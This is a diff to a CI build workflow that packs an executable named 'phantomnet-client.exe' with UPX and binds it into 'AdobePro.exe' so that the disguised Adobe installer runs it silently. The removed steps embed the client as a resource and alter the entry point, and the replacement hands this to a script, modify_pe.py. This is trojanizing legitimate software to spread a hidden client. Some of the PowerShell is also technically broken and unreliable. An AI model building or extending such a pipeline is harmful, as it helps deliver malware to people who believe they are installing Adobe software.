@@ -38,19 +38,6 @@ jobs:
       run: |
         .\upx-4.0.2-win64\upx.exe --force output\phantomnet-client.exe
 
-    - name: Embed the executable into AdobePro.exe
+    - name: Embed and modify AdobePro.exe
       run: |
-        $adobeProData = [System.IO.File]::ReadAllBytes("AdobePro.exe")
-        $pe = New-Object pefile.PE($adobeProData)
-        $embeddedExeData = [System.IO.File]::ReadAllBytes("output\phantomnet-client.exe")
-        $pe.AddResource("EMBEDDED_EXE", $embeddedExeData)
-        [System.IO.File]::WriteAllBytes("AdobePro_modified.exe", $pe.Data)
-
-    - name: Modify AdobePro.exe to run the embedded executable silently
-      run: |
-        $adobeProData = [System.IO.File]::ReadAllBytes("AdobePro_modified.exe")
-        $pe = New-Object pefile.PE($adobeProData)
-        $entryPoint = $pe.EntryPoint
-        $newEntryPoint = $pe.RvaToOffset($entryPoint) + 0x10  # Adjust the offset as needed
-        $pe.EntryPoint = $newEntryPoint
-        [System.IO.File]::WriteAllBytes("AdobePro_final.exe", $pe.Data)
+        python modify_pe.py AdobePro.exe output\phantomnet-client.exe
